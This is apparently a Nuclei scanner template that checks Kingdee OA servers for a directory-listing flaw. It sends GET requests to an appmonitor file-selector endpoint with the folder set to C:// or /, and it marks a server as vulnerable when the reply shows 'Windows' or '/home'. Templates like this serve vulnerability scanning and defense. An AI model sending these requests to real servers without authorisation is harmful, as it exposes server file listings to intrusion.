id: Kingdee-file-list
info:
  author: Str1am
  name: "\u91D1\u8776OA \u76EE\u5F55\u904D\u5386\u6F0F\u6D1E"
  severity: high
  tags: Kingdee,file
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - Windows
    - /home
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=C://&suffix='
  - '{{BaseURL}}/appmonitor/protected/selector/server_file/files?folder=/&suffix='
